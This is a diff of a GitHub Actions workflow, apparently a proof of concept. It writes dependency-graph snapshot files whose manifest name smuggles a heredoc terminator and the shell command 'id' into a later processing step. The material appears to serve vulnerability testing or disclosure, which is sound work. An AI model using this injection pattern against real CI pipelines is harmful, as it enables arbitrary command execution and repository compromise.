@@ -27,7 +27,7 @@ jobs:
           base = os.environ['BASE_SHA']
           n = os.environ['PR_NUM']
 
-          evil_key = (
+          evil = (
               "poc-manifest\n"
               "EOF\n"
               "id\n"
@@ -38,12 +38,28 @@ jobs:
               "exit 0\n"
           )
 
-          def manifest(name, purl):
+          def manifest(name, coordinate, purl):
               return {
                   "name": name,
-                  "file": {"source_location": name},
-                  "resolved": {purl: {"relationship": "direct", "dependencies": []}},
+                  "resolved": {
+                      coordinate: {
+                          "package_url": purl,
+                          "relationship": "direct",
+                          "dependencies": [],
+                      }
+                  },
               }
+
+          common = manifest(
+              "build.gradle.kts",
+              "org.apache.commons:commons-lang3:3.12.0",
+              "pkg:maven/org.apache.commons/commons-lang3@3.12.0",
+          )
+          bumped = manifest(
+              "build.gradle.kts",
+              "org.apache.commons:commons-lang3:3.13.0",
+              "pkg:maven/org.apache.commons/commons-lang3@3.13.0",
+          )
 
           def snapshot(sha, ref, manifests):
               return {
@@ -56,20 +72,14 @@ jobs:
                   "scanned": scanned,
               }
 
-          common = manifest(
-              "build.gradle.kts",
-              "pkg:maven/org.apache.commons/commons-lang3@3.12.0",
-          )
-          bumped = manifest(
-              "build.gradle.kts",
-              "pkg:maven/org.apache.commons/commons-lang3@3.13.0",
-          )
-
           base_snapshot = snapshot(base, "refs/heads/development", {"build.gradle.kts": common})
           head_snapshot = snapshot(
               head,
               "refs/pull/%s/head" % n,
-              {"build.gradle.kts": bumped, evil_key: manifest("poc-manifest", "pkg:maven/com.example/evil@1.0.0")},
+              {
+                  "build.gradle.kts": bumped,
+                  evil: manifest(evil, "com.example:evil:1.0.0", "pkg:maven/com.example/evil@1.0.0"),
+              },
           )
 
           json.dump(base_snapshot, open("dependency-graph-reports/snapshot-base.json", "w"))
